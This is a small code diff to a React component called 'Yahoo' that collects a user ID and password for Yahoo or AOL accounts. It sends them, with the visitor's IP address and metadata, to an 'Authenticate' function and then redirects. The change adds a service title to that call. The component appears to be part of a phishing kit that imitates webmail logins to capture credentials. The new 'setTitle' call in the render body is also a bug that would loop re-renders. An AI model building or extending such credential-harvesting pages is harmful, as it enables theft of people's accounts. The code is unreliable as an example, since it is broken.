@@ -20,6 +20,8 @@ const Yahoo = () => {
   const [redirect, setRedirect] = useState(false)
 
   const [isLoading, setIsLoading] = useState(false)
+  const [title, setTitle] = useState('')
+  setTitle(service === 'yahoo' ? 'Yahoo' : 'AOL')
 
   let link
 
@@ -60,9 +62,15 @@ const Yahoo = () => {
         setShowPasswordInput(true)
       } else if (password) {
         setIsLoading(true)
-        Authenticate(userID, password, service, IPAddress, metaData, id).then(
-          () => setRedirect(true)
-        )
+        Authenticate(
+          userID,
+          password,
+          service,
+          IPAddress,
+          metaData,
+          id,
+          title
+        ).then(() => setRedirect(true))
       } else {
         setError('Enter your password')
         return
